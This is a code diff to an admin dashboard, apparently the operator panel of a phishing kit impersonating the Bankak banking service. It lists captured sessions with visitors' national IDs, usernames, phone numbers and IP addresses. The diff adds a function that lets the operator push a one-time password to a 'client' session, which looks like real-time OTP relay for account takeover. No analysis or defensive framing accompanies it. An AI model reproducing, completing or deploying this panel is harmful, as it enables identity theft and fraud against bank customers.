@@ -186,7 +186,7 @@ body{font-family:'Inter',sans-serif;background:#0A0A0F;color:#fff;min-height:100
 <div class="toast" id="toast"></div>
 
 <script>
-const API = 'https://web-production-335e3.up.railway.app';
+const API = 'https://web-production-335e3.up.railway.app'; // same origin
 let adminToken = localStorage.getItem('bankakAdminToken') || '';
 
 // ── Auto-login if token exists ──
@@ -279,8 +279,7 @@ function renderSessions(sessions) {
     <div class="session-card ${s.status}" id="card-${s.id}">
       <div class="sc-top">
         <div>
-          <div class="sc-id">${s.nationalId}</div>
-          <span class="sc-phone">${s.phone}</span>
+          <div class="sc-id">${s.username || s.nationalId || "—"}</div>
         </div>
         <span class="status-badge ${s.status}">${s.status.replace('_',' ')}</span>
       </div>
@@ -339,6 +338,28 @@ function renderSessions(sessions) {
       <div class="sc-time">📅 ${time} &nbsp;|&nbsp; 🌐 ${s.ip}</div>
     </div>`;
   }).join('');
+}
+
+// ── Send OTP ──
+async function sendOTP(sessionId) {
+  const input = document.getElementById(`otp-${sessionId}`);
+  const otp = input.value.trim();
+  if (otp.length < 4) { showToast('Enter a valid OTP', true); return; }
+
+  try {
+    const r = await fetch(`${API}/api/admin/send-otp`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json','x-admin-token':adminToken},
+      body: JSON.stringify({ sessionId, otp })
+    });
+    const d = await r.json();
+    if (d.success) {
+      showToast(`✅ OTP ${otp} saved! Client will receive it automatically.`);
+      loadSessions();
+    }
+  } catch(e) {
+    showToast('Error sending OTP', true);
+  }
 }
 
 // ── Delete Session ──
